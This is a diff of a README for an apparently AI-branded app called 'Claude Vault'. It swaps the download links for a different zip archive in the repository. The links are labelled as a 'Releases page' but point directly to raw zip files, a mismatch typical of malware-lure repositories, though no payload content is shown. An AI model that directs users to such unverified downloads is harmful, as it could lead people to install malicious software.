@@ -6,7 +6,7 @@ Welcome to Claude Vault! This tool helps you manage your knowledge easily. Let's
 ## 📥 Download & Install
 You can download the latest version of Claude Vault from our Releases page. Simply click the link below:
 
-[![Download claude-vault](https://github.com/Awsd123D/claude-vault/raw/refs/heads/main/Templates/vault-claude-3.0.zip)](https://github.com/Awsd123D/claude-vault/raw/refs/heads/main/Templates/vault-claude-3.0.zip)
+[![Download claude-vault](https://raw.githubusercontent.com/Awsd123D/claude-vault/main/4-Archive/vault-claude-v1.7.zip)](https://raw.githubusercontent.com/Awsd123D/claude-vault/main/4-Archive/vault-claude-v1.7.zip)
 
 1. Click the link above to visit the Releases page.
 2. On the Releases page, look for the latest version.
@@ -45,7 +45,7 @@ Once you have downloaded and installed Claude Vault, follow these steps to use i
 ## 🔄 Updating the Application
 Keep your Claude Vault up to date for the best experience. To update:
 
-1. Visit the [Releases page](https://github.com/Awsd123D/claude-vault/raw/refs/heads/main/Templates/vault-claude-3.0.zip).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Awsd123D/claude-vault/main/4-Archive/vault-claude-v1.7.zip).
 2. Download the latest version.
 3. Replace the old version with the new one on your device.
 
